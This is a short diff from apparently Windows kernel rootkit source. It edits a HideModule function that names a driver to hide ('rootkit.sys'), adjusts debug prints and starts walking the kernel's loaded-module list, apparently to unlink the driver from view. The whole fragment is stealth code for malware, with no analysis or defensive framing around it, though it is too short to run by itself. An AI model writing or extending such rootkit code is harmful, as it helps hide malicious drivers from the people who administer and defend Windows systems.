@@ -125,11 +125,11 @@ BOOLEAN HideModule()
 
 //	tmpIrql = RaiseIRQLevel();
 
-	RtlInitUnicodeString( &driverToHide, L"myRootkit.sys" );
+	RtlInitUnicodeString( &driverToHide, L"rootkit.sys" );
 
-	DbgPrint("DriverToHide: %S\n",driverToHide.Buffer);
+	DbgPrint("Chowam driver: %S\n",driverToHide.Buffer);
 
-	DbgPrint("g_PsLoadedModuleList: %x\n",g_PsLoadedModuleList);
+//	DbgPrint("g_PsLoadedModuleList: %x\n",g_PsLoadedModuleList);
 
 	pm_current = g_PsLoadedModuleList;//->le_mod.Flink;
 
